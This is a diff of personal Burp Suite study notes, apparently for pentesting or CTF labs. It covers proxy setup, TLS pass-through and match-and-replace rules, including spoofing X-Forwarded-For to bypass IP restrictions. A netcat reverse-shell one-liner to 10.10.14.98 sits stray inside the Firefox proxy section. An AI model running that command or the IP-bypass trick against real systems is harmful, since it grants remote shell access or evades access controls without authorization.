@@ -11,13 +11,14 @@ Some of the tips very simple for simple problems, sometimes that is simply requi
 	GOTO Project settings -> no sandbox for builtin browser
 
 
-# FoxyProxy/Firefox proxy
+## FoxyProxy/Firefox proxy
 Firefox menu -> Settings -> Network Settings click Settings
 Select manual proxy configuration:
 	HTTP proxy: 127.0.0.1 8080
 	uncheck: Also use this proxy for FTP and HTTPS 
 	delete: ANYTHING in the "No proxy for" field
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.98 8888 >/tmp/f
+
 ## Burp Suite CA
 To intercept and analyze HTTPS traffic, BS has Certificate Authority and uses it to issue on-th-fly certifactes for each website that we visit and pass through Burp.
 
@@ -32,6 +33,7 @@ Proxy -> Options -> TLS Pass Through -> Add
 Need pass through for:
 - Targeting
 - Required mutual authenication or HTTP Public Key Pinning
+- 
 ## Bypass intercepting HTTPS traffic by configurating to forward traffics towards websites without decrypting and re-encrypting them first.
 
 ## SOCKS Proxy in Burp
@@ -43,6 +45,7 @@ right click and add under main `Target Site map` tab.
 
 ## How is the site structured -> Sitemap
 `Target -> Site map` Click the `>` and view in tree form.
+
 ## "Bad Request This combination of host and port requires TLS" -> Read Url
 Use https in url you fool!
 
@@ -80,9 +83,29 @@ Shortcut | Function
 ## Intruder Payloads
 - Recursive Grep = allows extract each paylaod from the response to the previous request - useful when you need to extract useful data or deliever an exploit 
 
+## Need to Spoof your IP in burp?
+- `Proxy -> Option -> Match and Replace`
+-  Requires you to find a custom IP Header
+	1. Leave Match field empty
+	2. In the Replace field: `X-Forwarded-For: 127.0.0.1`
+
+[Match and Replace](https://portswigger.net/burp/documentation/desktop/tutorials/using-match-and-replace): "*Note: In the wild, the de-facto standard header `X-Forwarded-For` is often used for this purpose, but you may encounter websites that use different custom headers. These are normally applied to your requests by an intermediary server, such as a load balancer or other reverse proxy belonging to a CDN, for example.*"
+
+[r3d-buck3t Medium Article](https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c)
+
+## Can't get a page you fuzzed?
+- `Proxy -> Option -> Match and Replace`
+	1. Change Type: Responder Header
+	2. Leave Match field: `Location: AnnoyingPage.Lang`
+	3. In the Replace field: empty
+
+
+
 ## References
 
 [Official Documentation](https://portswigger.net/burp/documentation/desktop)
 [THM basics](https://tryhackme.com/room/burpsuitebasics)
 [official-ps/blog/ssl-pass-through](https://portswigger.net/blog/ssl-pass-through-in-burp)
 [cybrary](https://www.cybrary.it/blog/burp-suite-tutorial-part-2-essential-shortcuts-in-burp-suite-proxy-for-more/)
+[Match and Replace](https://portswigger.net/burp/documentation/desktop/tutorials/using-match-and-replace)
+[r3d-buck3t Medium Article IP bypassing](https://medium.com/r3d-buck3t/bypass-ip-restrictions-with-burp-suite-fb4c72ec8e9c)
